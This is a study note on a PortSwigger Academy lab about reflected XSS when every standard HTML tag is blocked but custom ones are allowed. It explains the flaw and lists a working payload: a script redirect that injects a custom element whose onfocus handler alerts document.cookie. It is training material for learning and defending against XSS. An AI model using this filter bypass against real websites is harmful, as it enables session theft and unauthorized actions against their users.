# Lab: Reflected XSS into HTML context with all tags blocked except custom ones

**Official lab:** [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

## Lab idea

The reflected HTML context blocks standard tags but permits custom elements. It practices understanding how restrictive tag filters can be incomplete and why robust context-aware output handling is safer than blocklists.

## Vulnerability in brief
Cross-site scripting (XSS) is a web security vulnerability in which an application causes attacker-controlled content to be interpreted as executable script in a user’s browser. The code runs in the vulnerable site’s origin, so it can interfere with the victim’s interaction with that application and may access data or perform actions available to that user.

## Solution idea
1. Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID: <script> location =…
2. Click "Store" and "Deliver exploit to victim".

## Payloads / key values
- `YOUR-LAB-ID`
- `<script> location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>`
- `x`
- `onfocus`
- `alert`

## Official source
- [PortSwigger Academy: Lab: Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)
